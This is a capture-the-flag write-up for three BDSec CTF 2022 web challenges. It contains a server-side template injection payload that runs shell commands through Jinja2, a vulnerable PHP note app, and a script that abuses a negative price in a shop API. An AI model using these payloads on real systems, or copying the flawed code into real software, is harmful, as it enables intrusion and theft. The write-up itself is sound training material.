# BDSec CTF 2022

## 9-BDSec-CTF-2022-Writeup

## Web

### Jungle Templating

#### Description

```python
from flask import *
app = Flask(__name__)

@app.route('/',methods=['GET', 'POST'])
def base():
    person = ""
    if request.method == 'POST':
      if request.form['name']:
        person = request.form['name']
    palte = '''
    <!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Secure Search</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-0evHe/X+R7YkIZDRvuzKMRqM+OrBnVFBL6DOitfPri4tjfHxaWutUpFmBp4vmVor" crossorigin="anonymous">
  </head>
  <body>
    <h1 class="container my-3">Hi, %s</h1>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/js/bootstrap.bundle.min.js" integrity="sha384-pprn3073KE6tl6bjs2QrFaJGz5/SUsLqktiwsUTF55Jfv3qYSDhgCecCxMW52nD2" crossorigin="anonymous"></script>
    <div class="container my-3">
        <form action="/" method="post">
            <div class="mb-3">
              <label for="text" class="form-label">Type your name here:- </label>
              <input type="text" class="form-control" name="name" id="text" value="">
            </div>
            <button type="submit" class="btn btn-primary">See magic</button>
          </form>
    </div>
</body>
</html>'''% person
    return render_template_string(palte)

if __name__=="__main__":
	app.run("0.0.0.0",port=5000,debug=False)
```

We can see from the code, it's classic easy flask's SSTI, we can identify by bad templating reflection at `Hi, %s` without having the server sanitize/validate/filter the input.

I wrote a python code for solving this problem

```python
import requests
import re

URL="http://206.189.236.145:5000/"


# this payload taken from: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2

# for this part, we're trying to find where's the flag is
payload = "{{ config.__class__.__init__.__globals__['os'].popen('find / -name flag ').read() }}"
r = requests.post(URL, data={
    "name": payload
})
print(re.findall('<h1 class="container my-3">.*', r.text))

# after the previous payload we know the path to flag is /var/www/html/flag
payload = "{{ config.__class__.__init__.__globals__['os'].popen('cat /var/www/html/flag').read() }}"
r = requests.post(URL, data={
    "name": payload
})
print(re.findall('<h1 class="container my-3">.*', r.text))
```

The payload I used was from https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2

### Awesome Not Keeping

#### Description

```php
<!DOCTYPE html>
<html>

<head>
    <title>Awesome Note Keeping</title>
</head>

<body style="padding: 100px; background: #000000; color: #09b576">

    <h1>Welcome to Awesome Note Keeping</h1>
    <?php
    ini_set('display_errors', 1);
    ini_set('display_startup_errors', 1);
    error_reporting(E_ALL);
    if (isset($_POST["note"]) && isset($_POST["note_title"])) {
        if (empty($_POST["note"]) || empty($_POST["note_title"])) {
            echo "All fields are required.";
        } else if (strlen($_POST["note_title"]) >= 13) {
            echo "Note title is too long.";
        } else if (strlen($_POST["note"]) >= 40) {
            echo "Note is too long.";
        } else {
            $note_title = str_replace("flag", "", $_POST["note_title"]);
            if (!empty($note_title)) {
                if (file_exists($note_title . ".txt")) {
                    echo "There is already a note with that title and the note is <br>";
                    $note_title = str_replace("flag", "", $note_title);
                    $myNote = fopen($note_title . ".txt", "r");
                    echo fread($myNote, filesize($note_title . ".txt"));
                    fclose($myNote);
                } else {
                    $myNote = fopen($note_title . ".txt", "w");
                    fwrite($myNote, $_POST["note"]);
                    fclose($myNote);
                    echo "Your note has been saved.";
                }
            } else {
                echo "Sorry ! You can't create flag note.";
            }
        }
    }


    if (isset($_GET["note_title"]) && !empty($_GET["note_title"]) && $_GET["note_title"] != "flag") {
        if (file_exists($_GET["note_title"] . ".txt")) {
            $myNote = fopen($_GET["note_title"] . ".txt", "r");
            echo fread($myNote, filesize($_GET["note_title"] . ".txt"));
            fclose($myNote);
        } else {
            echo "Sorry ! Couldn't find any note with that title.";
        }
    }

    ?>
    <br>
    <h5>Create a Note</h5>
    <form action="" method="POST">
        <table>
            <tr>
                <td><label>Note Title : </label></td>
                <td><input type="text" name="note_title" /></td>
            </tr>
            <tr>
                <td><label>Note : </label></td>
                <td><textarea name="note"></textarea></td>
            </tr>
        </table>
        <input type="submit" value="Save" />
    </form>

    <h5>Read a Note</h5>
    <form action="" method="GET">
        <table>
            <tr>
                <td><label>Note Title : </label></td>
                <td><input type="text" name="note_title" /></td>
            </tr>
        </table>
        <input type="submit" value="Read" />
    </form>
    <!-- Hi Seli, I have created this awesome note keeping web app today. I have saved a backup file index.php.bak for you. Download it and check it out.  -->
</body>

</html>
```

#### How To

Maybe, the most important piece of codes you should see is this part:

```php
if (file_exists($note_title . ".txt")) {
    echo "There is already a note with that title and the note is <br>";
    $note_title = str_replace("flag", "", $note_title);
    $myNote = fopen($note_title . ".txt", "r");
    echo fread($myNote, filesize($note_title . ".txt"));
    fclose($myNote);
} else {
    $myNote = fopen($note_title . ".txt", "w");
    fwrite($myNote, $_POST["note"]);
    fclose($myNote);
    echo "Your note has been saved.";
}
```

If you see closely:

1. This shows that flag is already exist, and we can't create another flag instance

### Knight Squad Shop

#### How to solve

```python
import requests
import re
import html

URL="http://206.189.236.145:3000"
# URL="http://localhost:3000"

s = requests.session()

res = s.post(URL+"/api/v1/sell", json={"digispark": {"price": -100000000000000000000000000000000000000000000000}})
print(res.text)
print(s.cookies.get_dict())

print("-----")

res = s.post(URL+"/api/v1/sell", json={"digispark": {"quantity": 100}})
print(res.text)
print(s.cookies.get_dict())

print("-----")

res = s.get(URL+"/")
print(re.findall("Get flags.*", html.unescape(res.text)))
print(re.findall("You have.*", html.unescape(res.text)))

res = s.post(URL+"/api/v1/buy", json={"product": "digispark", "quantity":1})
print(res.text)
print(s.cookies.get_dict())

print("-----")

res = s.get(URL+"/")
print(re.findall("digispark.*", html.unescape(res.text)))
print(re.findall("Get flags.*", html.unescape(res.text)))
print(re.findall("You have.*", html.unescape(res.text)))

print("-----")

res = s.post(URL+"/api/v1/buy", json={"product": "flags", "quantity":1})
print(res.text)
```
